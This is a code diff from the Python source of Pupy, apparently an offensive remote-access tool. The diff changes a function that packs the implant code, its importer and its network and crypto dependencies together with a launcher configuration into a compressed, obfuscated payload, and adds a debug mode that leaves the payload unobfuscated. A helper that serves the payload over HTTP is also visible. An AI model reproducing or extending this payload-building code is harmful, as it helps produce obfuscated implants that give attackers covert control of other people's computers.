@@ -6,11 +6,11 @@
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 import cPickle, re, os.path, sys
 import rpyc, rsa, pyasn1, netaddr
+
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.utils.term import colorize
 from pupylib.payloads import dependencies
-
-ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
+from pupylib import ROOT
 
 def getLinuxImportedModules():
     '''
@@ -20,9 +20,9 @@ def getLinuxImportedModules():
         lines=f.read()
     return lines
 
-def pack_py_payload(conf):
-    print colorize('[+] ','green')+'generating payload ...'
-    fullpayload=[]
+def pack_py_payload(conf, debug=False):
+    print colorize('[+] ','green')+'generating PY payload ...'
+    fullpayload = []
 
     with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
         pupyimportercode = f.read()
@@ -31,19 +31,35 @@ def pack_py_payload(conf):
         '\n'.join([
             dependencies.loader(pupyimportercode, 'pupyimporter'),
             'import pupyimporter',
-            'pupyimporter.install()',
+            'pupyimporter.install(debug={})'.format(str(debug)),
             dependencies.importer('network', path=ROOT),
-            dependencies.importer(('rpyc', 'pyasn1', 'rsa', 'netaddr', 'tinyec'))
+            dependencies.importer((
+                'rpyc', 'pyasn1', 'rsa',
+                'netaddr', 'tinyec', 'umsgpack',
+                'poster', 'win_inet_pton'))
         ]) + '\n'
     )
 
     with open(os.path.join(ROOT,'pp.py')) as f:
-        code=f.read()
+        code = f.read()
 
     code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
+
+    if debug:
+        fullpayload = [
+            'import logging',
+            'logging.basicConfig()',
+            'logging.getLogger().setLevel(logging.DEBUG)'
+        ] + fullpayload
+
     fullpayload.append(code+'\n')
 
-    return compress_encode_obfs('\n'.join(fullpayload)+'\n')
+    payload = '\n'.join(fullpayload) + '\n'
+
+    if debug:
+        return payload
+
+    return compress_encode_obfs(payload, main=True)
 
 
 def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
